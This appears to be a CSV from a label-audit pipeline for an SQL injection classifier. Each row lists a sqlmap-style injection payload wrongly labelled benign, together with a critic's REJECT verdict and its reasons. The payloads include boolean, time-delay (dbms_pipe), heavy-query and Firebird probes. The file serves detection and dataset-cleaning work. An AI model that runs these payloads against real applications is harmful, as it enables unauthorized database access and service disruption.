row_index,payload_norm,sqli_type,db_engine,confidence,reasoning,label_source,verdict,critic_evidence,correction_json
7854,-7901 ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
7876,"1 ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (5 open, 8 close). Plus attack signal detected -> benign label wrong",
7923,"1"" or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
7961,"1 ) where 5550 = 5550 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
8008,"1%"" ) ) and 7358 = 6986--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
8039,"1%"" ) ) order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
8060,1' ) ) ) and 9198 = 9198--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
8067,1%' ) and 9226 = 7542--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
8110,"1' and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
8144,"-2125"" ) ) or 8571 = 8571--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
8213,"1', ( select ( case when ( 5141 = 5141 ) then ( ascii ( regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) ) ) else 5141/ ( select 0 from ( values ( 0 ) ) ) end ) from ( values ( 0 ) ) )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
8219,"1, ( select 9100 = ( 'qqpjq'|| ( select case 9100 when 9100 then 1 else 0 end from rdb$database ) ||'qzvzq' ) )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
8226,"1%' ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (5 open, 6 close). Plus attack signal detected -> benign label wrong",
8241,"1%"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (5 open, 6 close). Plus attack signal detected -> benign label wrong",
8289,"1' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (5 open, 8 close). Plus attack signal detected -> benign label wrong",
8296,-9809' order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
8329,-9562' or 8571 = 8571--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
8340,-6202 ) ) or 7845 = 1962--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
8361,1' in boolean mode ) and 9198 = 9198--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
8376,"1%"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (11 open, 14 close). Plus attack signal detected -> benign label wrong",
8381,1' in boolean mode ) and 3787 = 7750--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
8385,1' ) and 2564 = 3234--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
8400,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) ) +'",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (4 open, 5 close). Plus attack signal detected -> benign label wrong",
8401,-3304' ) ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
8438,-7984' order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
8440,"1%' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 11 close). Plus attack signal detected -> benign label wrong",
8467,"1"" ) and 9198 = 9198--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
8478,1%' ) ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
8485,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ""rbqs"" = ""rbqs",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (3). Plus attack signal detected -> benign label wrong,
8496,"1%' or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
8510,"1' in boolean mode ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) #",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (16 open, 17 close). Plus attack signal detected -> benign label wrong",
8530,1 ) ) and 2886 = 1133--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
8570,-3895' ) or 8645 = 5359--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
8600,-1280' ) ) or 8571 = 8571--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
8603,"1%"" ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (11 open, 14 close). Plus attack signal detected -> benign label wrong",
8614,"1%' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
8619,1 ) ) ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
8668,1 ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
8686,1' ) ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
8692,1' and 6621 = 4681--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
8749,1' and 2908 = 8067--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
8767,"1%"" ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (8 open, 11 close). Plus attack signal detected -> benign label wrong",
8769,1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) # twev,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
8776,"1' in boolean mode ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
8802,-7387' ) ) ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
8847,"-2321%"" ) or 2271 = 7683--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
8853,"1' ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
8873,-4644 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) # upwd,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
8941,"1"" ) where 9511 = 9511 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (16 open, 17 close). Plus attack signal detected -> benign label wrong",
8951,"-8709"" or 8571 = 8571--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
8956,"1', ( select 9100 = ( 'qqpjq'|| ( select case 9100 when 9100 then 1 else 0 end from rdb$database ) ||'qzvzq' ) )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (5). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
8958,"1%"" ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (5 open, 8 close). Plus attack signal detected -> benign label wrong",
8973,"1%' or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
9001,"1%"" ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (5 open, 8 close). Plus attack signal detected -> benign label wrong",
9015,"1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
9098,1' ) ) and 9198 = 9198--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
9110,-5769 ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
9134,-6764' ) or 2314 = 2017--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
9136,1 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
9151,"-5832"" ) or 1650 = 9011--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
9156,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and 'hmqd' = 'hmqd",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (3). Plus attack signal detected -> benign label wrong,
9158,"-9737"" ) ) ) order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
9173,"1%"" or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
9261,1%' ) ) and 7160 = 7249--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
9276,-8636' ) ) ) or 4301 = 7212--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
9282,"1%' ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
9287,"-5529"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
9352,-8922 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) -- krmh,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
9403,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'nhuk' = 'nhuk",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (3). Plus attack signal detected -> benign label wrong,
9434,"-3505"" ) or 5290 = 3436--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
9441,-5113' ) ) ) or 7200 = 3094--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
9452,"-3219"" ) order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
9481,"1' in boolean mode ) and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) #",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
9494,-6616 ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
9498,-3559' ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (5); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
9532,"1%' and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
9533,"1 ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
9610,"1' ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
9615,"1' in boolean mode ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) #",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
9658,"1"" where 7232 = 7232 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
9746,"1"" ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
9757,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (5). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
9766,-4208%' ) ) ) or 1133 = 9010--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
9771,-9100 ) or 8792 = 9550--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
9772,"1"" ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
9820,1' ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ),benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (5); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
9825,"1"" ) ) order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
